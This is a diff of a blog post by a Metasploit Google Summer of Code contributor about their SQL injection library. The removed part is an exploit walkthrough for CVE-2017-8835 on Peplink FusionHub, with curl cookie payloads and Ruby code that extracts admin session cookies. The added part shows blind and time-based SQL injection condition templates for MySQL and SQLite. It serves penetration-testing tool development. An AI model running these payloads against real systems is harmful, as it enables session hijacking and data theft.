@@ -309,104 +309,67 @@ was willing to develop.</p>
 <ul>
 <li>Methods for enumerating databases, table names, column names, users also were provided for each DBMS.</li>
 </ul>
-<h1 id="span-id981725cf5d343830f3590df23fbbf285writing-an-exploit-for-cve-2017-8835span"><span id='981725cf5d343830f3590df23fbbf285'>Writing an exploit for CVE-2017-8835</span></h1>
-<p>While browsing recent SQL injection CVEs, I came across <a href="https://www.cvedetails.com/cve/CVE-2017-8835/">CVE-2017-8835</a>, after searching a bit,
-<a href="https://www.exploit-db.com/exploits/42130">I found it on exploit-db</a>, seeing that the DBMS in-use is SQLite, this looked like a great candidate for testing
-SQLite injection support.</p>
-<p>Luckily, I was able to reproduce the vulnerability on <a href="https://www.peplink.com/products/fusionhub/">FusionHub</a>, by flashing a vulnerable firmware version,
-also, because the SQL injection (as reported in the Exploit-DB link) is boolean-based blind, and they are using it just to bypass authentication, so I thought about
-enumerating more.</p>
-<p>The final version of the module can be found <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/peplink_bauth_sqli.rb">here</a>, this
-is a step-by-step guide as of where I was able to save time writing it.</p>
-<h2 id="span-id04d84c9eded9f4fdc34c7148a3a77686analysis-of-the-vulnerabilityspan"><span id='04d84c9eded9f4fdc34c7148a3a77686'>Analysis of the vulnerability</span></h2>
-<p>When looking at the vulnerability, we notice that the injection happens on a SELECT statement, the injection point is like : <code>SELECT id from sessions where sessionid='&lt;INJECTION POINT&gt;';</code>,
-and it&rsquo;s just bypassing authentication (an admin must be authenticated for it to work), so, I quickly got FusionHub running with the vulnerable firmware, and started testing.</p>
-<p>Visiting <code>/cgi-bin/MANGA/admin.cgi</code> with the bauth cookie issued by the webserver:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --cookie <span style="color:#0ff;font-weight:bold">&#34;bauth=&#39; or 1=1--&#34;</span> http://192.168.1.254/cgi-bin/MANGA/admin.cgi -vv
-</code></pre></div><p><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1598710714/gsoc_2020/abb86y9pya2nv7xmemhh.png" alt="sqli_true"></p>
-<p>Now, visiting the same URL with an invalid cookie value (select statement should return 0 rows)</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --cookie <span style="color:#0ff;font-weight:bold">&#34;bauth=&#39; and 1=2--&#34;</span> http://192.168.1.254/cgi-bin/MANGA/admin.cgi -vv
-</code></pre></div><p><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1598710728/gsoc_2020/ldh97tzuxweyjldyuuyd.png" alt="sqli_false"></p>
-<p>It&rsquo;s obvious that the taken result from the select in the first case is the session of a user who is not logged-in, and in the second case, it worked as if the session cookie wasn&rsquo;t set
-(as you see, a <code>Set-Cookie</code> header was returned).</p>
-<p>This additional <code>Set-Cookie</code> header should be enough to distinguish between true and false expressions, and to retrieve all the data from the database, we have a place for a condition to evaluate,</p>
-<p>and we can see the result of its evaluation.</p>
-<h2 id="span-idd3af9b314b9b5c1de3c386ce802233ebcreation-of-the-sql-injection-objectspan"><span id='d3af9b314b9b5c1de3c386ce802233eb'>Creation of the SQL injection object</span></h2>
-<p>The code for creating the SQLi object is:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">@sqli = create_sqli(<span style="color:#0ff;font-weight:bold">dbms</span>: SQLitei::BooleanBasedBlind) <span style="color:#fff;font-weight:bold">do</span> |payload|
-  res = send_request_cgi({
-    <span style="color:#0ff;font-weight:bold">&#39;uri&#39;</span> =&gt; normalize_uri(target_uri.path, <span style="color:#0ff;font-weight:bold">&#39;cgi-bin&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;MANGA&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;admin.cgi&#39;</span>),
-    <span style="color:#0ff;font-weight:bold">&#39;method&#39;</span> =&gt; <span style="color:#0ff;font-weight:bold">&#39;GET&#39;</span>,
-    <span style="color:#0ff;font-weight:bold">&#39;cookie&#39;</span> =&gt; <span style="color:#0ff;font-weight:bold">&#34;bauth=&#39; or </span><span style="color:#0ff;font-weight:bold">#{</span>payload<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">--&#34;</span>
-  })
-  fail_with <span style="color:#0ff;font-weight:bold">&#39;Unable to connect to target&#39;</span> <span style="color:#fff;font-weight:bold">unless</span> res
-  res.get_cookies.empty? <span style="color:#007f7f"># no Set-Cookie header means the session cookie is valid</span>
-<span style="color:#fff;font-weight:bold">end</span>
-</code></pre></div><p>The code is very straightforward.</p>
+<h1 id="span-id981725cf5d343830f3590df23fbbf285my-google-summer-of-code-journeyspan"><span id='981725cf5d343830f3590df23fbbf285'>My Google Summer of Code journey</span></h1>
+<h2 id="span-id04d84c9eded9f4fdc34c7148a3a77686initial-workspan"><span id='04d84c9eded9f4fdc34c7148a3a77686'>Initial work</span></h2>
+<p>During the first month of the program, I started working on support for <code>MySQL/MariaDB</code>, the design of the library is really something I am proud of,
+from the beginning, I decided to let users provide a block that would query the server (so that the library does not have to handle networking stuff),
+and to make use of inheritance, so that SQL Injection objects behave the same, even if technically, their exploitation is done differently, take for example
+regular SQL injections, running:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#007f7f"># @sqli being a MySQLi::Common object</span>
+@sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#39;select group_concat(table_name) from information_schema.tables&#39;</span>)
+</code></pre></div><p>would yield the given SQL query to the block, but if the object was a MySQLi::BooleanBasedBlind, the same call would yield:</p>
+<pre><code>ascii(mid(cast((select group_concat(table_name) from information_schema.tables) as binary), 1, 1))&amp;1&lt;&gt;0
+ascii(mid(cast((select group_concat(table_name) from information_schema.tables) as binary), 1, 1))&amp;2&lt;&gt;0
+ascii(mid(cast((select group_concat(table_name) from information_schema.tables) as binary), 1, 1))&amp;4&lt;&gt;0
+...
+ascii(mid(cast((select group_concat(table_name) from information_schema.tables) as binary), 1, 1))&amp;128&lt;&gt;0
+
+ascii(mid(cast((select group_concat(table_name) from information_schema.tables) as binary), 2, 1))&amp;1&lt;&gt;0
+...
+</code></pre><p>Each of these is sent to the block to be evaluated as a condition, and leak one bit of information, recall that in boolean-based blind SQLi, we only know
+whether the query returned a result or not, so we can only leak one bit with one query, and this is exactly what the library does.</p>
+<p>Time-based blind support for <code>MySQL/MariaDB</code> was done in a similar manner, except that these conditions were wrapped inside if(&hellip;, sleep(delay), 1), so that
+a delay is produced if the condition is true, the library also takes care of checking if the target slept more than sleepdelay or not, and all of this is transparent
+to the user.</p>
+<p>The library had to be refactored multiple times, to support more options, to avoid having repetitive code and make unit-testing possible, also, for printing verbose messages that
+could be useful to the user, it was necessary to access the module <code>datastore</code> (because printing methods had to access the <code>VERBOSE</code> option which is set by the user),
+accessing it wasn&rsquo;t an easy task, because the whole library was a mixin (a module the user should include inside their metasploit module class), the mixin methods could access it,
+but not the classes that belong to it, a factory pattern was necessary to get this working, basically, a <code>create_sqli</code> method that the user calls, that instanciates one of the classes
+and injects the datastore through its constructor.</p>
+<p>My list of features to add kept growing during this period, and I implemented many of them (support for truncated queries, hex encoding strings, encoders and so on).</p>
+<p>Also, during the first month, I re-wrote some SQL injection modules to make them use my library, it reduced a lot of their complexity, and made them more efficient:</p>
 <ul>
-<li>The dbms argument is the class that should handle this injection, we know it&rsquo;s <code>SQLite</code> and it&rsquo;s boolean-based blind.</li>
-<li>Because it&rsquo;s boolean-based blind, the payload that our block will receive will always be a condition, we just have to query it.</li>
-<li>Our block should return a boolean, if the condition is true, the server should not yield a <code>Set-Cookie</code> header because it would return an existing session, our block should return true.</li>
-<li>If the condition is false, the server should yield a <code>Set-Cookie</code> header, so our block should return false.</li>
+<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/eyesofnetwork_autodiscovery_rce.rb">eyesofnetwork_autodiscovery_rce</a> : 527 LoC -&gt; 460 LoC, running time divided by 2.</li>
+<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/sqli/openemr/openemr_sqli_dump.rb">openemr_sqli_dump</a> : 235 LoC -&gt; 151 LoC, improved injection (now skips builtin tables and only retrieves userdata).</li>
 </ul>
-<p>Having the object created, it is no longer a blind SQL injection for the module writer, the method <code>run_sql</code> takes an SQL query, and takes care of converting it to a serie of conditions that will be passed to the block.
-(Without the SQL Injection library, module writers would need to do the binary search involved with blind SQL injection)
-First, let&rsquo;s check that the target is really vulnerable:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#fff;font-weight:bold">if</span> @sqli.test_vulnerable
-  Exploit::CheckCode::Vulnerable
-<span style="color:#fff;font-weight:bold">else</span>
-  Exploit::CheckCode::Safe
-<span style="color:#fff;font-weight:bold">end</span>
-</code></pre></div><p>The <code>test_vulnerable</code> method just checks if yielding <code>1=1</code> to the block returns <code>true</code>, and <code>1=2</code> returns <code>false</code>.</p>
-<h2 id="span-id58adb7987ef3ebb0891820242143bb4da-word-about-session-managementspan"><span id='58adb7987ef3ebb0891820242143bb4d'>a word about session management</span></h2>
-<p>For managing sessions, two tables are created using the following queries</p>
-<pre><code>CREATE TABLE IF NOT EXISTS sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, sessionid TEXT NOT NULL, tstamp TIMESTAMP NOT NULL, UNIQUE(sessionid))
-CREATE TABLE IF NOT EXISTS sessionsvariables (id INTEGER REFERENCES sessions(id) ON DELETE CASCADE, name TEXT NOT NULL, value TEXT NOT NULL, PRIMARY KEY (id, name))
-</code></pre><ul>
-<li><code>sessions</code> holds the actual cookie, in the <code>sessionid</code> field.</li>
-<li>for authenticated users, <code>sessionsvariables</code> contains many rows per session, one has <code>name=expire</code> and <code>value</code> being an expiration time, one having <code>name=username</code> and value being the username, and so on.</li>
-</ul>
-<h2 id="span-idd805c5ef0dda336d58014183916db15bplan-for-our-implementationspan"><span id='d805c5ef0dda336d58014183916db15b'>Plan for our implementation</span></h2>
-<p>Let&rsquo;s count the number of existing authenticated sessions, by counting the number of expiration times that exist in the database:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">session_count = @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select count(1) from sessionsvariables where name=&#39;expire&#39;&#34;</span>).to_i
-</code></pre></div><p>So, the plan is:</p>
-<ul>
-<li>Retrieve the <code>id</code>s of the sessions, sorted by expiration time (newest first).</li>
-<li>Filter them (if the user chose to only test admin/privileged sessions).</li>
-<li>Start retrieving the session cookies associated with each <code>id</code>.</li>
-</ul>
-<p>Let&rsquo;s start by retrieving the <code>id</code>s of the sessions, sorted by expiration time.</p>
-<p>Simplified code:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">digit_range = (<span style="color:#0ff;font-weight:bold">&#39;0&#39;</span>..<span style="color:#0ff;font-weight:bold">&#39;9&#39;</span>)
-session_ids = session_count.times.map <span style="color:#fff;font-weight:bold">do</span> |i|
-  <span style="color:#fff;font-weight:bold">id</span> = @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select id from sessionsvariables where name=&#39;expire&#39; &#34;</span> \
-  <span style="color:#0ff;font-weight:bold">&#34;order by cast(value as int) desc limit 1 offset </span><span style="color:#0ff;font-weight:bold">#{</span>i<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">output_charset</span>: digit_range)
-  <span style="color:#007f7f"># other code here, checking if the user is an admin if only admins should be returned</span>
-  <span style="color:#fff;font-weight:bold">id</span>
-<span style="color:#fff;font-weight:bold">end</span>
-</code></pre></div><p>The <code>digit_range</code> passed to <code>run_sql</code> is used to speed-up the process, since we know <code>id</code>s are integers, there are bits we already know, we don&rsquo;t need to leak 8 bits from each byte, by specifying the range of characters,
-the injection will only leak bits that change between bytes in that range.</p>
-<p>I will skip filtering for admins, you will find it in the final module, it can be done by checking if there is an entry having <code>name=rwa</code> and <code>value=1</code>, which means full access.</p>
-<p>Now, retrieving actual cookies:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">alphanumeric_range = (<span style="color:#0ff;font-weight:bold">&#39;0&#39;</span>..<span style="color:#0ff;font-weight:bold">&#39;z&#39;</span>)
-cookies = [ ]
-session_ids.each_with_index <span style="color:#fff;font-weight:bold">do</span> |<span style="color:#fff;font-weight:bold">id</span>, idx|
-  cookie = @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select sessionid from sessions where id=</span><span style="color:#0ff;font-weight:bold">#{</span><span style="color:#fff;font-weight:bold">id</span><span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">output_charset</span>: alphanumeric_range)
-  cookies &lt;&lt; cookie
-  <span style="color:#fff;font-weight:bold">if</span> datastore[<span style="color:#0ff;font-weight:bold">&#39;EnumUsernames&#39;</span>]
-    username = @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select value from sessionsvariables where name=&#39;username&#39; and id=</span><span style="color:#0ff;font-weight:bold">#{</span><span style="color:#fff;font-weight:bold">id</span><span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
-  <span style="color:#fff;font-weight:bold">end</span>
-  <span style="color:#007f7f"># more code that is irrelevant to this post</span>
-<span style="color:#fff;font-weight:bold">end</span>
-</code></pre></div><h2 id="span-id707ae1bbecb994d13ec98cb72f2316b7results-of-the-executionspan"><span id='707ae1bbecb994d13ec98cb72f2316b7'>Results of the execution</span></h2>
-<p><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1598711216/gsoc_2020/wlzmh7voeuco9hkoqt7r.png" alt="retrieval of cookies"></p>
-<p>(The error, <code>Login is required ...</code> just indicates that <code>x4J...2Ps</code> is not an admin cookie, it&rsquo;s the cookie of an unprivileged user, but we notice that the other cookie was tested successfully to be an admin cookie).</p>
-<p>Not only we reproduced the vulnerability, but we were able to retrieve the actual cookies with minimal effort using the library.</p>
-<p>a note about this module: using methods like <code>enum_table_names</code>, <code>enum_table_columns</code>, <code>dump_table_fields</code> might not work because the size of the string embedded in SQL queries is limited (the vulnerable code is written in C,
-and fixed-size buffers are used), and these methods generate long queries to deal with <code>NULL</code> values, convert (cast) types, encode and so on, for cases like this, we can always fall back to <code>run_sql</code>, which should work in most cases.</p>
+<h2 id="sqlite-support-and-specs-for-the-library">SQLite support and specs for the library</h2>
+<p><code>SQLite</code> support was the second on my priority list, mostly because I always thought <code>SQLite</code> was different because of its minimalism, different in a way that could make it hard for module writers to implement SQL injection attacks
+when it is in-use, the part that was a bit more complex was time-based blind SQL injection, because <code>SQLite</code> does not have a function like sleep, that causes a delay in the response, I had to use heavy queries, which are queries that
+take time to be computed, luckily, there exists a function called <code>randomblob</code>, which takes a size parameter, and returns random data of that size, the user specifies a delay in seconds, and I do some benchmarking in the library to
+find the perfect randomblob parameter that would cause that delay, once found, <code>1000000</code> for example, my SQL injection would work like this:</p>
+<p>For example:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#007f7f"># @sqli being a SQLitei::TimeBasedBlind object</span>
+@sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select group_concat(tbl_name,&#39;;&#39;) from sqlite_master where type=&#39;table&#39;&#34;</span>)
+</code></pre></div><p>The library would yield conditions like this to the block, to be evaluated, and would measure timings, and return the data.</p>
+<pre><code>unicode(substr(cast((#{query}) as blob), 1, 1))&amp;1&lt;&gt;0 and randomblob(1000000)
+unicode(substr(cast((#{query}) as blob), 1, 1))&amp;2&lt;&gt;0 and randomblob(1000000)
+unicode(substr(cast((#{query}) as blob), 1, 1))&amp;4&lt;&gt;0 and randomblob(1000000)
+...
+unicode(substr(cast((#{query}) as blob), 1, 1))&amp;128&lt;&gt;0 and randomblob(1000000)
+unicode(substr(cast((#{query}) as blob), 2, 1))&amp;1&lt;&gt;0 and randomblob(1000000)
+...
+</code></pre><p>If a bit is 1, it should get to the second part of the <code>and</code>, which should take some time to run, this is how the library knows the outcome of the condition.</p>
+<p>I also had to refactor code when adding support for SQLite, because I noticed there was a lot of code shared between DBMS-specific implementations, on blind queries mostly, so I added a Utils mixin that acts like an interface that
+is implemented in all the classes that make use of the shared code.</p>
+<p>For testing, I wrote a module for exploiting an SQL injection on Peplink Balance routers (writeup <a href="https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a">here</a>, and a testing module for <a href="https://github.com/incredibleindishell/sqlite-lab">sqlite-lab</a>.</p>
+<h2 id="support-for-postgresql-and-other-database-management-systems">Support for PostgreSQL, and other database-management systems</h2>
+<p>PostgreSQL support was easy to add, because of how popular the DBMS is, it was easy to find vulnerable software to test it, to get it running in a testing environment and so on, I wrote a module for <a href="https://www.cvedetails.com/cve/CVE-2019-13373/">CVE-2019-13373</a>, which is a vulnerability
+found on some versons of D-Link Central WiFi Manager CWM(100), and a test module for vulnerable code I wrote myself.</p>
+<p>Support for MSSQL and Oracle was added in the last month of the program, I provided test modules for each, but no exploit on real vulnerabilities, might implement some in the future.</p>
 <h1 id="span-id6f8b794f3246b0c1e1780bb4d4d5dc53conclusionspan"><span id='6f8b794f3246b0c1e1780bb4d4d5dc53'>Conclusion</span></h1>
 <p>Working with rapid7 members on the Metasploit Framework was really a great experience for me, I learned a lot of things, would like to thank my mentor, Jeffrey Martin (<code>Op3n4M3</code>), as well as other contributors who helped me out,
 <code>h00die</code>, <code>zeroSteiner</code> and <code>dwelch-r7</code> to name a few.</p>
+<p>I learned a lot, on advanced git topics, on software testing and programming/software engineering best practices.</p>
 <p>I will keep contributing to the project, hopefully getting all of the library merged, and getting some other issues I had noticed in the codebase fixed.</p>
 
   </div>
